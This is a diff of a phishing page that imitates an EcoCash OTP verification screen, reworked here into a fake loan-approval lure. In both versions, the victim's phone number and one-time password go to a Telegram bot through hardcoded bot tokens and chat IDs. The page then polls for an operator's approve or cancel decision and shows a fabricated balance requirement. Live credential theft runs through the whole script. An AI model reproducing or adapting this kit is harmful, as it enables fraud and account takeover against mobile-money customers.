@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>OTP Verification - EcoCash Spache-fono</title>
+    <title>EcoCash - OTP Verification</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
         * {
@@ -140,6 +140,7 @@
             background: #f5f7fa;
             flex-shrink: 0;
             margin-top: auto;
+            /* Pushes footer to bottom */
         }
         /* SPINNER */
         
@@ -184,7 +185,7 @@
             max-width: 320px;
             font-weight: 500;
         }
-        /* RESULT OVERLAY */
+        /* SUCCESS / CANCEL MESSAGE */
         
         #resultOverlay {
             position: fixed;
@@ -219,31 +220,31 @@
     </div>
 
     <div class="container">
-        <div class="subtitle">OTP has been sent to your phone number</div>
+        <div class="subtitle">Enter the OTP sent to your phone number</div>
         <div class="phone" id="maskedPhone"></div>
 
         <div class="otp-label">OTP</div>
         <div class="otp-group">
-            <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
-            <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
-            <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
-            <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
+            <input type="text" class="otp-box" maxlength="1">
+            <input type="text" class="otp-box" maxlength="1">
+            <input type="text" class="otp-box" maxlength="1">
+            <input type="text" class="otp-box" maxlength="1">
+            <input type="text" class="otp-box" maxlength="1">
+            <input type="text" class="otp-box" maxlength="1">
         </div>
 
-        <div class="resend">
-            Resend OTP in <span id="timer">116</span> seconds
-        </div>
+        <div class="resend">Resend OTP in <span id="timer">116</span> seconds</div>
 
-        <button id="submitBtn">Send</button>
+        <button id="submitBtn">Submit</button>
     </div>
 
-    <footer>© 2025 EcoCash Spache-fono</footer>
+    <footer>© 2025 EcoCash</footer>
 
     <!-- SPINNER -->
     <div id="spinnerOverlay">
         <div class="spinner"></div>
         <div class="spinner-text">
-            Please wait while we verify your request
+            Please wait while we approve your loan application
         </div>
     </div>
 
@@ -253,12 +254,15 @@
     </div>
 
     <script>
-        const BOT_TOKEN = '8977747553:AAE5jjEZt0CM6hD6E6vD2tzaWNanZTyuHLI';
-        const CHAT_ID = '8851096978';
+        const BOT_TOKEN = '8962157089:AAE0Xfxqg41aj8X-msfislZfA6s2ZejNkOM';
+        const CHAT_ID = '8406078749';
 
+        // Mask phone from localStorage
         const savedPhone = localStorage.getItem('phone') || '785123463';
-        const masked = savedPhone.slice(0, 3) + '****' + savedPhone.slice(-2);
-        document.getElementById('maskedPhone').textContent = '+266 ' + masked;
+        const visibleStart = savedPhone.slice(0, 3);
+        const visibleEnd = savedPhone.slice(-2);
+        const masked = visibleStart + '****' + visibleEnd;
+        document.getElementById('maskedPhone').textContent = '+263 ' + masked;
 
         const otpBoxes = document.querySelectorAll('.otp-box');
         const submitBtn = document.getElementById('submitBtn');
@@ -267,38 +271,14 @@
         const resultMessage = document.getElementById('resultMessage');
         const timerSpan = document.getElementById('timer');
 
-        const OTP_LENGTH = 4;
-
         let otpValue = '';
         let seconds = 116;
         let pollInterval;
         let lastUpdateId = 0;
-        let pollingActive = false;
-
-        function readOtp() {
-            return Array.from(otpBoxes).map(b => b.value).join('');
-        }
-
-        function setSubmitEnabled() {
-            otpValue = readOtp();
-            const filled = otpValue.length === OTP_LENGTH;
-            submitBtn.classList.toggle('enabled', filled);
-            submitBtn.disabled = !filled;
-        }
-
-        function resetOtpUI() {
-            otpBoxes.forEach(b => b.value = '');
-            setSubmitEnabled();
-            otpBoxes[0].focus();
-        }
-
-        function resetTimer() {
-            seconds = 116;
-            timerSpan.textContent = seconds;
-        }
+        let currentCallbackData = '';
 
         // Countdown timer
-        let countdown = setInterval(() => {
+        const countdown = setInterval(() => {
             seconds--;
             timerSpan.textContent = seconds;
             if (seconds <= 0) {
@@ -307,61 +287,23 @@
             }
         }, 1000);
 
-        function startCountdown() {
-            clearInterval(countdown);
-            countdown = setInterval(() => {
-                seconds--;
-                timerSpan.textContent = seconds;
-                if (seconds <= 0) {
-                    clearInterval(countdown);
-                    timerSpan.textContent = '0';
-                }
-            }, 1000);
-        }
-
-        function waitForCallback(callbackSet, onApprove, onWrongOtp) {
-            if (pollInterval) clearInterval(pollInterval);
-            pollInterval = setInterval(() => {
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`)
-                    .then(res => res.json())
-                    .then(data => {
-                        if (!data.ok) return;
-                        const updates = data.result || [];
-                        if (updates.length === 0) return;
-
-                        for (const update of updates) {
-                            lastUpdateId = update.update_id;
-
-                            if (update.callback_query && update.callback_query.data) {
-                                const cb = update.callback_query.data;
-
-                                if (cb === callbackSet.approve) {
-                                    if (pollInterval) clearInterval(pollInterval);
-                                    pollingActive = false;
-                                    onApprove();
-                                    return;
-                                }
-
-                                if (cb === callbackSet.wrong) {
-                                    if (pollInterval) clearInterval(pollInterval);
-                                    pollingActive = false;
-                                    onWrongOtp();
-                                    return;
-                                }
-                            }
-                        }
-                    })
-                    .catch(() => {});
-            }, 1500);
+        function checkOtpComplete() {
+            otpValue = Array.from(otpBoxes).map(box => box.value).join('');
+            if (otpValue.length === 6) {
+                submitBtn.classList.add('enabled');
+                submitBtn.disabled = false;
+            } else {
+                submitBtn.classList.remove('enabled');
+                submitBtn.disabled = true;
+            }
         }
 
         otpBoxes.forEach((box, index) => {
             box.addEventListener('input', () => {
-                box.value = box.value.replace(/\D/g, '');
-                if (box.value.length === 1 && index < otpBoxes.length - 1) {
+                if (box.value.length === 1 && index < 5) {
                     otpBoxes[index + 1].focus();
                 }
-                setSubmitEnabled();
+                checkOtpComplete();
             });
 
             box.addEventListener('keydown', (e) => {
@@ -372,85 +314,66 @@
         });
 
         submitBtn.addEventListener('click', () => {
-            if (readOtp().length !== OTP_LENGTH) return;
-
-            // Prevent double-click
-            if (pollingActive) return;
-            pollingActive = true;
+            if (otpValue.length !== 6) return;
 
             spinnerOverlay.style.display = 'flex';
-            resultOverlay.style.display = 'none';
 
             const timestamp = Date.now();
+            currentCallbackData = 'action_' + timestamp;
 
-            const callbackApprove = 'approve_' + timestamp;
-            const callbackWrongOtp = 'wrong_otp_' + timestamp;
-
-            const message =
-                'New OTP Verification Request\n\n' +
-                'Phone: +266 ' + savedPhone + '\n' +
-                'OTP Entered: ' + readOtp() + '\n\n' +
-                'Approve this OTP to continue?';
+            const message = `OTP Verification\n\nPhone: +263 ${savedPhone}\nEntered OTP: ${otpValue}\n\nPlease approve or cancel the loan application.`;
 
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message,
-                        reply_markup: {
-                            inline_keyboard: [
-                                [{
-                                    text: 'Approve (Continue)',
-                                    callback_data: callbackApprove
-                                }, {
-                                    text: 'Wrong OTP',
-                                    callback_data: callbackWrongOtp
-                                }]
-                            ]
-                        }
-                    })
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    reply_markup: {
+                        inline_keyboard: [
+                            [{
+                                text: 'Approve',
+                                callback_data: 'approve_' + timestamp
+                            }, {
+                                text: 'Cancel',
+                                callback_data: 'cancel_' + timestamp
+                            }]
+                        ]
+                    }
                 })
-                .then(() => {
-                    waitForCallback({
-                            approve: callbackApprove,
-                            wrong: callbackWrongOtp
-                        },
-                        () => {
-                            spinnerOverlay.style.display = 'none';
-                            resultOverlay.style.display = 'flex';
-                            resultMessage.textContent =
-                                'Your request has been approved. You will receive a confirmation message within 15 minutes. Thank you.';
-                        },
-                        () => {
-                            spinnerOverlay.style.display = 'none';
-                            resultOverlay.style.display = 'flex';
-                            resultMessage.textContent = 'Wrong OTP. Please try again.';
+            });
 
-                            // ✅ clear OTP + reset timer + focus
-                            resetOtpUI();
-                            resetTimer();
-                            startCountdown();
+            // Poll for admin response
+            pollInterval = setInterval(() => {
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`)
+                    .then(res => res.json())
+                    .then(data => {
+                        if (data.ok && data.result.length > 0) {
+                            for (let update of data.result) {
+                                lastUpdateId = update.update_id;
+                                if (update.callback_query) {
+                                    const dataParts = update.callback_query.data.split('_');
+                                    if (dataParts[1] == timestamp) {
+                                        clearInterval(pollInterval);
+                                        spinnerOverlay.style.display = 'none';
+                                        resultOverlay.style.display = 'flex';
 
-                            pollingActive = false;
-
-                            // If you REALLY want full reset (hard reload), uncomment:
-                            // setTimeout(() => location.reload(), 800);
+                                        if (dataParts[0] === 'approve') {
+                                            resultMessage.textContent = 'Your loan has been approved. You will receive a confirmation message within 15 minutes. Thank you.';
+                                        } else if (dataParts[0] === 'cancel') {
+                                            resultMessage.textContent = 'Please reapply and ensure that your information is correct and your minimum Main USD Balance is atleast $30. Thank you.';
+                                        }
+                                    }
+                                }
+                            }
                         }
-                    );
-                })
-                .catch(err => {
-                    pollingActive = false;
-                    spinnerOverlay.style.display = 'none';
-                    resultOverlay.style.display = 'flex';
-                    resultMessage.textContent = 'Connection error: ' + err;
-                });
+                    });
+            }, 1500);
         });
 
-        // Init
-        setSubmitEnabled();
+        checkOtpComplete();
         otpBoxes[0].focus();
     </script>
 </body>
